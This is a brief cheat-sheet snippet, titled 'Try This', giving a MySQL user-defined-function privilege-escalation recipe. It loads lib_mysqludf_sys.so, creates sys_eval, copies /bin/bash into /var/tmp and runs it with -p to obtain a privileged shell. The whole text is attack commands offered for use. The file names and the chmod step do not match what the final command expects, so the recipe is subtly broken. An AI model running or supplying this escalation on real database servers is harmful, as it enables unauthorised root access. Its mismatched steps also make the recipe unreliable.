- - -

## Try This  : 

```mysql
mysql> show databases;
mysql> use <table>;
mysql> CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
mysql> \! clear
mysql> select sys_eval("cp /bin/bash /var/tmp/evil-bash ; chmod u+x /var/tmp/bash");
mysql> exit
```

```sh
cd /var/tmp ; ./bash  -p 
```

- - -
